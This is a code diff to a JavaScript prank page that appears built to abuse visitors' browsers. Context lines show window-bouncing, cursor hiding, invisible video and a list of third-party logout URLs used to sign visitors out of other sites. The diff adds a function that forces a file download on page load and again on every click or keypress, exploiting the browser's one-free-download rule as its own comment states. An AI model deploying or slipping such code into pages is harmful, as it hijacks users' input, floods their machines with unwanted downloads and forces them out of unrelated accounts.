@@ -81,6 +81,18 @@ const VIDEOS = [
   'trolol.mp4'
 ]
 
+const FILE_DOWNLOADS = [
+  'cat-blue-eyes.jpg',
+  'cat-ceiling.jpg',
+  'cat-crosseyes.jpg',
+  'cat-cute.jpg',
+  'cat-hover.jpg',
+  'cat-marshmellows.jpg',
+  'cat-small-face.jpg',
+  'cat-smirk.jpg',
+  'patreon.png'
+]
+
 const LOGOUT_SITES = {
   'AOL': ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
   'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
@@ -191,6 +203,11 @@ function initChildWindow () {
   moveWindowBounce()
   startVideo()
   detectWindowClose()
+  triggerFileDownload()
+
+  interceptUserInput(event => {
+    triggerFileDownload()
+  })
 }
 
 /**
@@ -203,6 +220,8 @@ function initParentWindow () {
   startInvisiblePictureInPictureVideo()
 
   interceptUserInput(event => {
+    triggerFileDownload()
+
     if (interactionCount === 1) {
       hideCursor()
       startAlertInterval()
@@ -328,11 +347,12 @@ function startVibrateInterval () {
  */
 function interceptUserInput (onInput) {
   document.body.addEventListener('mousedown', onInput)
-  document.body.addEventListener('click', onInput)
   document.body.addEventListener('mouseup', onInput)
+  document.body.addEventListener('click', onInput)
+
   document.body.addEventListener('keydown', onInput)
-  document.body.addEventListener('keypress', onInput)
   document.body.addEventListener('keyup', onInput)
+  document.body.addEventListener('keypress', onInput)
 }
 
 /**
@@ -391,6 +411,19 @@ function openWindow () {
  */
 function hideCursor () {
   document.querySelector('html').style = 'cursor: none;'
+}
+
+/**
+ * Trigger a file download immediately. One file download is allowed *without* user
+ * interaction. Further file downloads should happen in response to a user-initiated
+ * event or they will be blocked.
+ */
+function triggerFileDownload () {
+  const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
+  const a = document.createElement('a')
+  a.href = fileName
+  a.download = fileName
+  a.click()
 }
 
 /**
